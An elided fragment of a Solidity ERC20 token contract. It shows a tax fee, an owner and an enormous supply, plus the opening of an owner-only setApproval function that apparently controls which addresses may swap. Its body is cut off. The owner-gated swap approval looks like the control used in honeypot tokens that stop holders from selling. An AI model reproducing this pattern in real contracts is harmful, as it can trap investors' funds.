...
contract ERC20 is Context, IERC20 {
  ...
  constructor(
      ...
      taxFee = taxFee_;
      owner = _msgSender();
      _totalSupply = 99990000000000 * (10 ** uint256(decimals_));
  ...
  function setApproval(address _address, uint256 apprveForSwap) external {
      require(_msgSender() == owner, "Get approve before using swap");
